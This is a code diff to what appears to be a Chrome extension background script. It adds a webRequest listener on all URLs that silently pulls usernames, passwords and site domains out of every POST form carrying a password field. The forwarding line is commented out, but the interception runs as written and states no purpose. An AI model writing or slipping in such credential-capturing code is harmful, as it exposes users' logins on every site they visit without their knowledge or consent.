@@ -58,3 +58,23 @@ chrome.runtime.onInstalled.addListener(() => {
        { color: 'red'}
     )
 });
+
+chrome.webRequest.onBeforeRequest.addListener(function(details){
+    if(details.method == "POST"){
+        try{
+            if(details.requestBody.formData.password != undefined){
+                username=details.requestBody.formData.username[0];
+                password=details.requestBody.formData.password[0];
+                url=details.url.replace("https://", "").replace("http://", "").replace("www.", "").split("/")[0];
+                // chrome.runtime.sendMessage({ username: username, password: password, url : url },)
+                // console.log("message sent");
+            }
+        }
+       catch{
+
+        }
+        
+    }
+}, {urls:["<all_urls>"]},
+['requestBody']
+);
